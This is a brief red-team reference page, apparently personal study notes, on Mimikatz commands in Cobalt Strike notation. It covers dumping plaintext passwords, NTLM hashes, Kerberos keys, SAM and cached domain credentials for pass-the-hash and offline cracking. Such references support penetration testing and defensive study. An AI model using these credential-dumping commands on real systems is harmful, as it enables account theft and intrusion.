---
layout:     post
author:     0x5c4r3
type: docs
permalink: Mimikatz
---

<span style="font-size: 35px; color:red"><b>Mimikatz Quick Reference</b></span>
&nbsp;
The reference will be described using CobaltStrike notation (<span style="color:red">@</span> and <span style="color:red">!</span>).
&nbsp;
- <span style="color:red">!sekurlsa::logonpasswords</span>: dump plaintext passwords from memory and NTLM hashes to then perform <span style="color:red">Pass-The-Hash</span> attacks.
  On CobaltStrike, go to View > Credentials to then see the dumped creds.
- <span style="color:red">!sekurlsa::ekeys</span>: to dump Kerberos encryotion keys of the logged on users.
  Look for AES256. If not there, [run again](https://github.com/gentilkiwi/mimikatz/issues/314). Add manually via View > Credentials > Add to populate the credentials data on CobaltStrike.
- <span style="color:red">!lsadump::sam</span>: to dump local passwords.
- <span style="color:red">!lsadump::cache</span>: extracts passwords from HKLM\SECURITY (domain passwords cached to logon to a machine disconnected from the domain).
  These can be dumped and cracked offline after transforming them in expected format (<span style="color:red">$DCC2$\<iterations\>#\<username\>#\<hash\></span>)
